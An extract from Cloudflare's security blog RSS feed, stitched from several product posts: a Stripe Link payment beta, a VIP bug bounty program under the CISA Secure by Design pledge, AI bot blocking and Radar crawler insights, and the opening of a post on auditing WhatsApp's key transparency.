          &lt;/figure&gt;&lt;p&gt;Cloudflare serves millions of customers and their millions of domains across nearly every country on Earth. However, as a global company, the payment landscape can be complex — especially in regions outside of North America. While credit cards are very popular for online purchases in the US, the global picture is quite different. &lt;a href="https://www.fisglobal.com/-/media/fisglobal/files/campaigns/global-payments%20report/FIS_TheGlobalPaymentsReport_2023.pdf"&gt;&lt;u&gt;60% of consumers across EMEA, APAC and LATAM choose alternative payment methods&lt;/u&gt;&lt;/a&gt;. For instance, European consumers often opt for SEPA Direct Debit, a bank transfer mechanism, while Chinese consumers frequently use Alipay, a digital wallet.&lt;/p&gt;&lt;p&gt;At Cloudflare, we saw this as an opportunity to meet customers where they are. Today, we're thrilled to announce that we are expanding our payment system and launching a closed beta for a new payment method called &lt;a href="https://www.cloudflare.com/lp/cloudflare-introduces-stripe-link/"&gt;&lt;u&gt;Stripe Link&lt;/u&gt;&lt;/a&gt;. The checkout experience will be faster and more seamless, allowing our self-serve customers to pay using saved bank accounts or cards with Link. Customers who have saved their payment details at any business using Link can quickly check out without having to reenter their payment information.&lt;/p&gt;&lt;p&gt;These are the first steps in our efforts to expand our payment system to support global payment methods used by customers around the world.&lt;b&gt; &lt;/b&gt;We'll be rolling out new payment methods gradually, ensuring a smooth integration and gathering feedback from our customers every step of the way.&lt;/p&gt;

          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h2&gt;Until next year&lt;/h2&gt;

In line with this commitment, we're enhancing our vulnerability disclosure policy by launching a VIP bug bounty program, giving top researchers early access to our products. Keep an eye out for future updates regarding Cloudflare's CISA pledge as we work together to shape a safer digital future.</description><content:encoded>&lt;p&gt;As our digital world becomes increasingly more complex, the importance of cybersecurity grows ever more critical. As a result, Cloudflare is proud to promote our commitment to the &lt;a href="https://cisa.gov/"&gt;&lt;u&gt;Cybersecurity and Infrastructure Security Agency (CISA)&lt;/u&gt;&lt;/a&gt; &lt;a href="https://www.cisa.gov/securebydesign"&gt;&lt;u&gt;‘Secure by Design’&lt;/u&gt;&lt;/a&gt; &lt;a href="https://www.cisa.gov/securebydesign/pledge"&gt;&lt;u&gt;pledge&lt;/u&gt;&lt;/a&gt;. The commitment is built around seven security goals, aimed at enhancing the safety of our products and delivering the most secure solutions to our customers.&lt;/p&gt;&lt;p&gt;Cloudflare’s commitment to the CISA pledge reflects our dedication to transparency and accountability to our customers, and to cybersecurity best practices. Furthermore, Cloudflare is committed to being a trusted partner by sharing our strategies to ensure the highest priority is placed on safeguarding our customers’ security. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Bug bounty VIP program&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#bug-bounty-vip-program"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Cloudflare has successfully managed a &lt;a href="https://blog.cloudflare.com/cloudflare-bug-bounty-program/"&gt;&lt;u&gt;public Vulnerability Disclosure Program (VDP)&lt;/u&gt;&lt;/a&gt; for years; our belief is that collaboration is the cornerstone of effective cybersecurity. We are excited to announce a major milestone in our journey to meet &lt;a href="https://www.cisa.gov/securebydesign/pledge#:~:text=READ%20MORE-,Vulnerability%20disclosure%20policy,-Goal%3A%20Within%20one"&gt;&lt;u&gt;Goal #5 of the pledge&lt;/u&gt;&lt;/a&gt;: our program will now include a bug bounty VIP program in conjunction with our bug bounty public program.&lt;/p&gt;&lt;p&gt;Continuous investment in maturing our bug bounty program is a vital tool for the success of any security organization. By encouraging broader participation in vulnerability testing, we open the door to more diverse perspectives and expertise, ultimately leading to stronger, more resilient security measures. Additionally, the new VIP program will allow us greater flexibility in engaging security researchers on upcoming betas for Cloudflare products, and will allow us to award higher bounty payouts.&lt;/p&gt;&lt;p&gt;Our commitment to this effort underscores our belief that a safer Internet is achievable through shared responsibility and proactive engagement. The security team at Cloudflare is looking forward to implementing a more proactive approach to securing our products with the launch of the new bug bounty VIP program!&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;What is in scope for the new VIP program? &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-is-in-scope-for-the-new-vip-program"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The new bug bounty VIP program is an exclusive hub for select security researchers who either have the specialized technical expertise in the niche areas Cloudflare is building products in (such as Cloudflare Workers) or have demonstrated a deep understanding of our products and platform by actively participating in the public program with meaningful security findings. As a VIP member, security researchers will have access to beta testing environments for Cloudflare products&lt;b&gt;.&lt;/b&gt; This includes early access to our newest features and unannounced products before they go live.&lt;/p&gt;&lt;p&gt;The VIP program’s scope will be carefully modeled from Cloudflare's product release roadmap. Security researchers will have the opportunity to influence Cloudflare’s product and security development before release. VIP program participants also have the option to participate in external/gray box penetration testing activities (&lt;a href="https://docs.hackerone.com/en/articles/9064940-spot-checks"&gt;&lt;u&gt;Spot Checks&lt;/u&gt;&lt;/a&gt;) for higher bounties related to security findings for upcoming product releases or critical infrastructure and services. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7gAwO2RQgbNJch1omgazkx/0562c67e91daa0998eeb41672fe3b564/image1.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h2&gt;The VIP program’s new &amp;amp; enhanced reward structure&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-vip-programs-new-enhanced-reward-structure"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;We believe that exceptional contributions deserve exceptional rewards. As a result, we’ve restructured our bounty offerings for the VIP program with higher payouts&lt;b&gt;.&lt;/b&gt; Recognizing the specialized skills and expertise required, VIP researchers will be eligible for significantly higher rewards.&lt;b&gt; &lt;/b&gt;We have also introduced bonus rewards for high-impact findings, particularly those that address critical vulnerabilities in our beta projects through the aforementioned Spot Checks. To further incentivize meaningful contributions, security researchers in our public program will receive milestone bonuses and be invited to our VIP program based on the number and quality of their submissions over time.&lt;/p&gt;&lt;div&gt;

                    &lt;td&gt;
                        &lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;Low&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                    &lt;td&gt;
                        &lt;p&gt;&lt;span&gt;&lt;span&gt;$10,000-15,000&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
                    &lt;/td&gt;
                    &lt;td&gt;
                        &lt;p&gt;&lt;span&gt;&lt;span&gt;$4,000-7,000&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
                    &lt;/td&gt;
                    &lt;td&gt;
                        &lt;p&gt;&lt;span&gt;&lt;span&gt;$1,000-3,000&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
                    &lt;/td&gt;
                    &lt;td&gt;
                        &lt;p&gt;&lt;span&gt;&lt;span&gt;$250-750&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
            &lt;/tbody&gt;
        &lt;/table&gt;
    &lt;/figure&gt;
&lt;/div&gt;
          &lt;div&gt;
            &lt;h2&gt;What outcomes are we driving with the new VIP program?&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-outcomes-are-we-driving-with-the-new-vip-program"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The VIP bug bounty program’s focus is not only finding and fixing bugs, but it’s also aimed at fostering a deeper, more impactful relationship with our security researchers. Moreover, these outcomes align well with the &lt;a href="https://www.cisa.gov/securebydesign/pledge#:~:text=READ%20MORE-,Vulnerability%20disclosure%20policy,-Goal%3A%20Within%20one"&gt;&lt;u&gt;CISA Vulnerability Disclosure Policy (VDP) goal&lt;/u&gt;&lt;/a&gt;. By offering exclusive access to beta software and enhanced rewards, our goals are as follows:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Elevate security standards&lt;/b&gt;: VIP researchers focusing on the most critical assets allows for further hardening of the overall security posture of Cloudflare’s products and services. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Accelerate product development&lt;/b&gt;: Early identification of vulnerabilities allows the remediation of potential issues before they reach production, yielding faster, more secure, and more stable releases.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Foster innovation&lt;/b&gt;: Involving researchers in the development process creates an additional feedback loop that encourages innovative approaches to security challenges. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Encourage collaboration&lt;/b&gt;: The bug bounty team will encourage collaborative blog posts for select reports as a way to disseminate security learnings and build partnerships with researchers.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;This is a great professional growth opportunity for anyone in the technical research space as it gives participants the ability to work on cutting-edge technology with complex challenges, and can provide future opportunities for career/skill development.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How does Cloudflare benefit from it?&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-does-cloudflare-benefit-from-it"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The launch of the VIP program marks a new chapter in Cloudflare’s security journey. We are excited about the opportunity to partner more closely with our top security researchers to build safer products for customers. Together, we can achieve new heights in security excellence:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Stronger security&lt;/b&gt;: Security researchers with expertise in niche topics can help enhance Cloudflare's defenses against emerging and novel threats.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Proactive risk management&lt;/b&gt;: The new VIP program provides Cloudflare an additional avenue to identify and mitigate risks early in the product release cycle, reducing the likelihood of future security incidents.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Reinforced trust&lt;/b&gt;: Our commitment to security is central to our customer relationships and the trust they place in Cloudflare; by continuously improving our security posture, we seek to preserve that trust.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;
          &lt;div&gt;
            &lt;h2&gt;How can you help?&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-can-you-help"&gt;
              
            &lt;/a&gt;

AI is increasingly ubiquitous, and Cloudflare is leaning into the new opportunities and challenges it presents in a big way. This year for Cloudflare’s birthday, we’ve extended our AI Assistant capabilities to help you build new WAF rules, added AI bot traffic insights on Cloudflare Radar, and given customers new AI bot blocking capabilities.  &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;AI Assistant for WAF Rule Builder&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#ai-assistant-for-waf-rule-builder"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5RYC4wmCDbs0axY92FfkFk/a728906cb6a902dd1c78ec93a0f650c2/BLOG-2564_1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;At Cloudflare, we’re always listening to your feedback and striving to make our products as user-friendly and powerful as possible. One area where we've heard your feedback loud and clear is in the complexity of creating custom and rate-limiting rules for our Web Application Firewall (WAF). With this in mind, we’re excited to introduce a new feature that will make rule creation easier and more intuitive: the AI Assistant for WAF Rule Builder. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7avSjubqlfg7L8ymKEztgk/7c3c31e50879ec64bccc384bdfcd5524/BLOG-2564_2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;By simply entering a natural language prompt, you can generate a custom or rate-limiting rule tailored to your needs. For example, instead of manually configuring a complex rule matching criteria, you can now type something like, "Match requests with low bot score," and the assistant will generate the rule for you. It’s not about creating the perfect rule in one step, but giving you a strong foundation that you can build on. &lt;/p&gt;&lt;p&gt;The assistant will be available in the Custom and Rate Limit Rule Builder for all WAF users. We’re launching this feature in Beta for all customers, and we encourage you to give it a try. We’re looking forward to hearing your feedback (via the UI itself) as we continue to refine and enhance this tool to meet your needs.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;AI bot traffic insights on Cloudflare Radar&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#ai-bot-traffic-insights-on-cloudflare-radar"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;AI platform providers use bots to crawl and scrape websites, vacuuming up data to use for model training. This is frequently done without the permission of, or a business relationship with, the content owners and providers. In July, Cloudflare urged content owners and providers to &lt;a href="https://blog.cloudflare.com/declaring-your-aindependence-block-ai-bots-scrapers-and-crawlers-with-a-single-click/"&gt;&lt;u&gt;“declare their AIndependence”&lt;/u&gt;&lt;/a&gt;, providing them with a way to block AI bots, scrapers, and crawlers with a single click. In addition to this so-called “easy button” approach, sites can provide more specific guidance to these bots about what they are and are not allowed to access through directives in a &lt;a href="https://www.cloudflare.com/en-gb/learning/bots/what-is-robots-txt/"&gt;&lt;u&gt;robots.txt&lt;/u&gt;&lt;/a&gt; file. Regardless of whether a customer chooses to block or allow requests from AI-related bots, Cloudflare has insight into request activity from these bots, and associated traffic trends over time.&lt;/p&gt;&lt;p&gt;Tracking traffic trends for AI bots can help us better understand their activity over time — which are the most aggressive and have the highest volume of requests, which launch crawls on a regular basis, etc. The new &lt;a href="https://radar.cloudflare.com/traffic#ai-bot-crawler-traffic"&gt;&lt;b&gt;&lt;u&gt;AI bot &amp;amp; crawler traffic &lt;/u&gt;&lt;/b&gt;&lt;u&gt;graph on Radar’s Traffic page&lt;/u&gt;&lt;/a&gt; provides insight into these traffic trends gathered over the selected time period for the top known AI bots. The associated list of bots tracked here is based on the &lt;a href="https://github.com/ai-robots-txt/ai.robots.txt"&gt;&lt;u&gt;ai.robots.txt list&lt;/u&gt;&lt;/a&gt;, and will be updated with new bots as they are identified. &lt;a href="https://developers.cloudflare.com/api/operations/radar-get-ai-bots-timeseries-group-by-user-agent"&gt;&lt;u&gt;Time series&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/api/operations/radar-get-ai-bots-summary-by-user-agent"&gt;&lt;u&gt;summary&lt;/u&gt;&lt;/a&gt; data is available from the Radar API as well. (Traffic trends for the full set of AI bots &amp;amp; crawlers &lt;a href="https://radar.cloudflare.com/explorer?dataSet=ai.bots"&gt;&lt;u&gt;can be viewed in the new Data Explorer&lt;/u&gt;&lt;/a&gt;.)&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h2&gt;Blocking more AI bots&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#blocking-more-ai-bots"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/UiFu8l6K4Pm3ulxTK3XU0/541d109e29a9ae94e4792fdf94f7e4aa/BLOG-2564_4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;For Cloudflare’s birthday, we’re following up on our previous blog post, &lt;a href="https://blog.cloudflare.com/declaring-your-aindependence-block-ai-bots-scrapers-and-crawlers-with-a-single-click/"&gt;&lt;i&gt;&lt;u&gt;Declaring Your AIndependence&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;, with an update on the new detections we’ve added to stop AI bots. Customers who haven’t already done so can simply &lt;a href="https://dash.cloudflare.com/?to=/:account/:zone/security/bots/configure"&gt;&lt;u&gt;click the button&lt;/u&gt;&lt;/a&gt; to block AI bots to gain more protection for their website. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Enabling dynamic updates for the AI bot rule&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#enabling-dynamic-updates-for-the-ai-bot-rule"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The old button allowed customers to block &lt;i&gt;verified&lt;/i&gt; AI crawlers, those that respect robots.txt and crawl rate, and don’t try to hide their behavior. We’ve added new crawlers to that list, but we’ve also expanded the previous rule to include 27 signatures (and counting) of AI bots that &lt;i&gt;don’t &lt;/i&gt;follow the rules. We want to take time to say “thank you” to everyone who took the time to use our “&lt;a href="https://docs.google.com/forms/d/14bX0RJH_0w17_cAUiihff5b3WLKzfieDO4upRlo5wj8"&gt;&lt;u&gt;tip line&lt;/u&gt;&lt;/a&gt;” to point us towards new AI bots. These tips have been extremely helpful in finding some bots that would not have been on our radar so quickly. &lt;/p&gt;&lt;p&gt;For each bot we’ve added, we’re also adding them to our “Definitely automated” definition as well. So, if you’re a self-service plan customer using &lt;a href="https://blog.cloudflare.com/super-bot-fight-mode/"&gt;&lt;u&gt;Super Bot Fight Mode&lt;/u&gt;&lt;/a&gt;, you’re already protected. Enterprise Bot Management customers will see more requests shift from the “Likely Bot” range to the “Definitely automated” range, which we’ll discuss more below.&lt;/p&gt;&lt;p&gt;Under the hood, we’ve converted this rule logic to a &lt;a href="https://developers.cloudflare.com/waf/managed-rules/"&gt;&lt;u&gt;Cloudflare managed rule&lt;/u&gt;&lt;/a&gt; (the same framework that powers our WAF). This enables our security analysts and engineers to safely push updates to the rule in real-time, similar to how new WAF rule changes are rapidly delivered to ensure our customers are protected against the latest CVEs. If you haven’t logged back into the Bots dashboard since the previous version of our AI bot protection was announced, click the button again to update to the latest protection. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2tI8Yqxt1S0UPapImb32J4/6cb9e9bf423c370383edb820e5722929/BLOG-2564_5.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;The impact of new fingerprints on the model &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-impact-of-new-fingerprints-on-the-model"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;One hidden beneficiary of fingerprinting new AI bots is our ML model. &lt;a href="https://blog.cloudflare.com/cloudflare-bot-management-machine-learning-and-more/"&gt;&lt;u&gt;As we’ve discussed before&lt;/u&gt;&lt;/a&gt;, our global ML model uses supervised machine learning and greatly benefits from more sources of labeled bot data. Below, you can see how well our ML model recognized these requests as automated, before and after we updated the button, adding new rules. To keep things simple, we have shown only the top 5 bots by the volume of requests on the chart. With the introduction of our new managed rule, we have observed an improvement in our detection capabilities for the majority of these AI bots. Button v1 represents the old option that let customers block only verified AI crawlers, while Button v2 is the newly introduced feature that includes managed rule detections.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2CZVGyDCp9ZtMrZdIi49fE/aacd04d240e9348b5a9b65bad4b470e2/BLOG-2564_6.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;So how did we make our detections more robust? As we have mentioned before, sometimes &lt;a href="https://blog.cloudflare.com/cloudflare-bot-management-machine-learning-and-more/"&gt;&lt;i&gt;&lt;u&gt;a single attribute can give a bot away&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;. We developed a sophisticated set of heuristics tailored to these AI bots, enabling us to effortlessly and accurately classify them as such. Although our ML model was already detecting the vast majority of these requests, the integration of additional heuristics has resulted in a noticeable increase in detection rates for each bot, and ensuring we score every request correctly 100% of the time. Transitioning from a purely machine learning approach to incorporating heuristics offers several advantages, including faster detection times and greater certainty in classification. While deploying a machine learning model is complex and time-consuming, new heuristics can be created in minutes. &lt;/p&gt;&lt;p&gt;The initial launch of the AI bots block button was well-received and is now used by over 133,000 websites, with significant adoption even among our Free tier customers. The newly updated button, launched on August 20, 2024, is rapidly gaining traction. Over 90,000 zones have already adopted the new rule, with approximately 240 new sites integrating it every hour. Overall, we are now helping to protect the intellectual property of more than 146,000 sites from AI bots, and we are currently blocking 66 million requests daily with this new rule. Additionally, we’re excited to announce that support for configuring AI bots protection via Terraform will be available by the end of this year, providing even more flexibility and control for managing your bot protection settings.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Bot behavior&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#bot-behavior"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;With the enhancements to our detection capabilities, it is essential to assess the impact of these changes to bot activity on the Internet. Since the launch of the updated AI bots block button, we have been closely monitoring for any shifts in bot activity and adaptation strategies. The most basic fingerprinting technique we use to identify AI bot looking for simple user-agent matches. User-agent matches are important to monitor because they indicate the bot is transparently announcing who they are when they’re crawling a website. &lt;/p&gt;&lt;p&gt;The graph below shows a volume of traffic we label as AI bot over the past two months. The blue line indicates the daily request count, while the red line represents the monthly average number of requests. In the past two months, we have seen an average reduction of nearly 30 million requests, with a decrease of 40 million in the most recent month.This decline coincides with the release of Button v1 and Button v2. Our hypothesis is that with the new AI bots blocking feature, Cloudflare is blocking a majority of these bots, which is discouraging them from crawling. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/23ULxmxBIRskEONlWVIvlA/1dbd3d03239047492c2d4f7307217d97/BLOG-2564_7.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;This hypothesis is supported by the observed decline in requests from several top AI crawlers. Specifically, the Bytespider bot reduced its daily requests from approximately 100 million to just 50 million between the end of June and the end of August (see graph below). This reduction could be attributed to several factors, including our new AI bots block button and changes in the crawler's strategy.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5UwtyZSXULrVzIqLcICGKd/fdf02c15d17e1d7ed248ba5f8a97eb54/BLOG-2564_8.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;We have also observed an increase in the accountability of some AI crawlers. The most basic fingerprinting technique we use to identify AI bot looking for simple user-agent matches. User-agent matches are important to monitor because they indicate the bot is transparently announcing who they are when they’re crawling a website. These crawlers are now more frequently using their agents, reflecting a shift towards more transparent and responsible behavior. Notably, there has been a dramatic surge in the number of requests from the Perplexity user agent. This increase might be linked to &lt;a href="https://rknight.me/blog/perplexity-ai-is-lying-about-its-user-agent/"&gt;previous accusations&lt;u&gt; &lt;/u&gt;&lt;/a&gt;that Perplexity did not properly present its user agent, which could have prompted a shift in their approach to ensure better identification and compliance. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7Hq2vUMqqdNCyaxNTCg3JD/610ad53d57203203c5176229245c8086/BLOG-2564_9.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;These trends suggest that our updates are likely affecting how AI crawlers interact with content. We will continue to monitor AI bot activity to help users control who accesses their content and how. By keeping a close watch on emerging patterns, we aim to provide users with the tools and insights needed to make informed decisions about managing their traffic. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Wrap up&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#wrap-up"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;We’re excited to continue to explore the AI landscape, whether we’re finding more ways to make the Cloudflare dashboard usable or new threats to guard against. Our AI insights on Radar update in near real-time, so please join us in watching as new trends emerge and discussing them in the &lt;a href="https://community.cloudflare.com/"&gt;&lt;u&gt;Cloudflare Community&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;</content:encoded><guid isPermaLink="false">6HqKUMoXg0wFIQg9howLMX</guid><category>Birthday Week</category><category>Bot Management</category><category>Bots</category><category>AI Bots</category><category>AI</category><category>Machine Learning</category><category>Generative AI</category><category>Security</category><category>Developers</category><category>Developer Platform</category><category>Application Services</category><category>Product News</category></item><item><title>Cloudflare helps verify the security of end-to-end encrypted messages by auditing key transparency for WhatsApp</title><link>https://blog.cloudflare.com/key-transparency/</link><description>Cloudflare is now verifying WhatsApp’s Key Transparency audit proofs to ensure the security of end-to-end encrypted messaging conversations without having to manually check QR codes. We are publishing the results of the proof verification to https://dash.key-transparency.cloudflare.com for independent researchers and security experts to compare against WhatsApp’s. Cloudflare does not have access to underlying public key material or message metadata as part of this infrastructure.</description><content:encoded>&lt;p&gt;Chances are good that today you’ve sent a message through an &lt;a href="https://www.cloudflare.com/learning/privacy/what-is-end-to-end-encryption"&gt;&lt;u&gt;end-to-end encrypted (E2EE)&lt;/u&gt;&lt;/a&gt; messaging app such as WhatsApp, Signal, or iMessage. While we often take the privacy of these conversations for granted, they in fact rely on decades of research, testing, and standardization efforts, the foundation of which is a &lt;a href="https://www.cloudflare.com/learning/ssl/how-does-public-key-encryption-work/"&gt;&lt;u&gt;public-private key exchange&lt;/u&gt;&lt;/a&gt;. There is, however, an oft-overlooked implicit trust inherent in this model: that the messaging app infrastructure is distributing the public keys of all of its users correctly.&lt;/p&gt;&lt;p&gt;Here’s an example: if Joe and Alice are messaging each other on WhatsApp, Joe uses Alice’s phone number to retrieve Alice’s public key from the WhatsApp database, and Alice receives Joe’s public key. Their messages are then encrypted using this key exchange, so that no one — even WhatsApp — can see the contents of their messages besides Alice and Joe themselves. However, in the unlikely situation where an attacker, Bob, manages to register a different public key in WhatsApp’s database, Joe would try to message Alice but unknowingly be messaging Bob instead. And while this threat is most salient for journalists, activists, and those most vulnerable to cyber attacks&lt;i&gt;, &lt;/i&gt;we believe that protecting the privacy and integrity of end-to-end encrypted conversations is for everyone.&lt;/p&gt;&lt;p&gt;There are several methods that end-to-end encrypted messaging apps have deployed thus far to protect the integrity of public key distribution, the most common of which is to do an in-person verification of the QR code fingerprint of your public key (&lt;a href="https://faq.whatsapp.com/2416198805185327?helpref=faq_content"&gt;&lt;u&gt;WhatsApp&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://signal.org/blog/safety-number-updates/"&gt;&lt;u&gt;Signal&lt;/u&gt;&lt;/a&gt; both have a version of this). As you can imagine, this experience is inconvenient and unwieldy, especially as your number of contacts and group chats increase.&lt;/p&gt;&lt;p&gt;Over the past few years, there have been significant developments in this area of cryptography, and WhatsApp has paved the way with their &lt;a href="https://engineering.fb.com/2023/04/13/security/whatsapp-key-transparency/"&gt;&lt;u&gt;Key Transparency announcement&lt;/u&gt;&lt;/a&gt;. But as an independent third party, Cloudflare can provide stronger reassurance: that’s why we’re excited to announce that we’re now verifying WhatsApp’s Key Transparency audit proofs. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Auditing: the next frontier of encryption &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#auditing-the-next-frontier-of-encryption"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;We didn’t build this in a vacuum: similar to how the web and messaging apps became encrypted over time, we see auditing public key infrastructure as the next logical step in securing Internet infrastructure. This solution builds upon learnings from &lt;a href="https://en.wikipedia.org/wiki/Certificate_Transparency"&gt;&lt;u&gt;Certificate Transparency&lt;/u&gt;&lt;/a&gt; and&lt;a href="https://binary.transparency.dev/"&gt;&lt;u&gt; Binary Transparency&lt;/u&gt;&lt;/a&gt;, which share some of the underlying data structure and cryptographic techniques, and we’re excited about the formation of a &lt;a href="https://mailarchive.ietf.org/arch/browse/keytrans/"&gt;&lt;u&gt;working group at the IETF&lt;/u&gt;&lt;/a&gt; to make multi-party operation of Key Transparency-like systems tractable for a broader set of use cases. &lt;/p&gt;&lt;p&gt;We see our role here as a pioneer of a real world deployment of this auditing infrastructure, working through and sharing the operational challenges of operating a system that is critical for a messaging app used by billions of people around the world.   &lt;/p&gt;&lt;p&gt;We’ve also done this before — in 2022, Cloudflare announced &lt;a href="https://blog.cloudflare.com/cloudflare-verifies-code-whatsapp-web-serves-users/"&gt;&lt;u&gt;Code Verify&lt;/u&gt;&lt;/a&gt;, a partnership in which we verify that the code delivered in the browser for &lt;a href="https://web.whatsapp.com/"&gt;&lt;u&gt;WhatsApp Web&lt;/u&gt;&lt;/a&gt; has not been tampered with. When users run WhatsApp in their browser, the &lt;a href="https://faq.whatsapp.com/639766781216714?cms_platform=web&amp;amp;helpref=faq_content"&gt;&lt;u&gt;WhatsApp Code Verify extension&lt;/u&gt;&lt;/a&gt; compares a hash of the code that is executing in the browser with the hash that Cloudflare has of the codebase, enabling WhatsApp web users to easily see whether the code that is executing is the code that was publicly committed to. &lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/451BUpYOdkMZ9KqtGKBbFQ/69edee8fe9e64d124b16908a95bf0933/Code_Verify_-_Blog.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;In Code Verify, Cloudflare builds a non-mutable chain associating the WhatsApp version with the hash of its code.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Cloudflare’s role in Key Transparency is similar in that we are checking that a tree-based directory of public keys (more on this later) has been constructed correctly, and has been done so consistently over time.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How Key Transparency works&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-key-transparency-works"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
